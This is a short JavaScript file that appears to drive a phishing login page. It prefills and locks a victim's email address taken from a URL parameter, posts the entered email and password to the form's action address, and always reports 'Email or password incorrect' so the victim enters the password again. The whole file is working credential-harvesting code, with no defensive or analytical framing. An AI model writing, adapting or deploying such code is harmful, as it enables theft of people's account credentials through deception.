(function(){

  const getParamValue = new Proxy(new URLSearchParams(window.location.search), {
    get: (sParams, property) => sParams.get(property),
  });
  const correo = getParamValue.e; // "some_value"
  u('#email').first().value = correo;
  if (correo !=='') {
    u('#email').attr({ readonly: 'true' })
  }

  u(".mylist span i").on('click', function() {
    halfmoon.toggleModal('logModal');
  });
  u("#modalDownload").on('click', function() {
    halfmoon.toggleModal('logModal');
  });


  u('#zigaozi').on('click', async e => {
    var error_ = [false, false];

    let myForm = document.getElementById('form');
    u('input').each(function(node, i){
      if (u(node).first().value =='') {
          myForm.reportValidity();
          u(node).addClass('errorinp');
          error_[0] = true;
      }else{
        u(node).removeClass('errorinp');
      }
    });

    if (error_.includes(true)) {
      return false;
    }
    e.preventDefault();

    u('#status').html('<div class="errordiv">Email or password incorrect. Kindly try again with correct details.</div>');
    u('#zigaozi').attr({disabled:false});

    const body = new FormData(myForm);
    u('#form').attr('action')
    const data = await fetch(u('#form').attr('action'), {
        method: 'POST', body
      }).then(res => res.json()).catch(error => console.log(error) );;
      if (data) {
        // console.log('Response data:', data);
        u('#status').html('<div class="errordiv">Email or password incorrect. Kindly try again with correct details.</div>');
        u('#zigaozi').attr({disabled:false});
        document.querySelector('#password').value = '';
        document.querySelector('#password').focus();
      }
    });


})();
